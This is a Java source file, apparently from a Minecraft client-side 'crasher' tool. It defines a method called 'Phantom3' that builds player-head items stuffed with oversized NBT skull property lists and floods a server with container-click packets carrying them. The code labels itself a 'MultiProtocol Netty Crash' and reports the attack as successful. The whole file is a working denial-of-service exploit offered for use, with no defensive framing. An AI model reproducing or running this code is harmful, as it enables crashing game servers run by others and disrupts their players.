package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Optional;
import java.util.UUID;
import java.util.concurrent.ThreadLocalRandom;
import java.util.stream.IntStream;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.helpers.BypassHelper.StringType;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class Phantom3 implements Crasher {
    private static final String METHOD_NAME = "Phantom3";
    private boolean enabled = false;

    public Phantom3() {
    }

    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int length = Integer.parseInt(args[4]);
        String type = args[5].toLowerCase(Locale.ROOT);
        this.setEnabled(true);
        msgHelper.sendMessage("Starting crashing with &f" + this.getName(), true);
        ItemStack itemStack = this.getSkullStack(size, length, type);

        for(int i = 0; i < packets; ++i) {
            PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, itemStack, new Int2ObjectOpenHashMap()));
        }

        this.setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private ItemStack getSkullStack(int size, int length, String propType) {
        CompoundTag skullTag = new CompoundTag();
        CompoundTag skullOwner = new CompoundTag();
        CompoundTag properties = this.getSkullCompound(size, length, propType);
        skullOwner.put("Properties", properties);
        skullOwner.putString("Name", String.valueOf(ThreadLocalRandom.current().nextInt()));
        skullOwner.putString("Id", UUID.randomUUID().toString());
        skullTag.put("SkullOwner", skullOwner);
        return new ItemStack(Items.PLAYER_HEAD, 1, Optional.of(skullTag));
    }

    private CompoundTag getSkullCompound(int size, int length, String propType) {
        CompoundTag properties = new CompoundTag();
        switch (propType) {
            case "full":
                String boostString = bypassHelper.generateString(length, StringType.BOOST2);
                ListTag propertyList = new ListTag();

                for(int a = 0; a < size; ++a) {
                    CompoundTag compound = new CompoundTag();
                    compound.putString("Value", boostString);
                    compound.putString("Signature", boostString);
                    propertyList.add(compound);
                }

                properties.put("0", propertyList);
                break;
            case "empty":
                ListTag propertyList = new ListTag();
                IntStream.range(0, size).forEach((i) -> propertyList.add(new CompoundTag()));
                properties.put("", propertyList);
        }

        return properties;
    }

    public String getName() {
        return "Phantom3";
    }

    public boolean getEnabled() {
        return this.enabled;
    }

    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    public List<OptionUtil> getOptions() {
        return List.of(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("Size", OptionType.INTEGER), new OptionUtil("Length", OptionType.INTEGER), new OptionUtil("Type", OptionType.LIST, new String[]{"Empty", "Full"}));
    }

    public String getArgsUsage() {
        return "packets[100], size[1000], length[10], type[empty]";
    }

    public String getDescription() {
        return "MultiProtocol Netty Crash";
    }
}
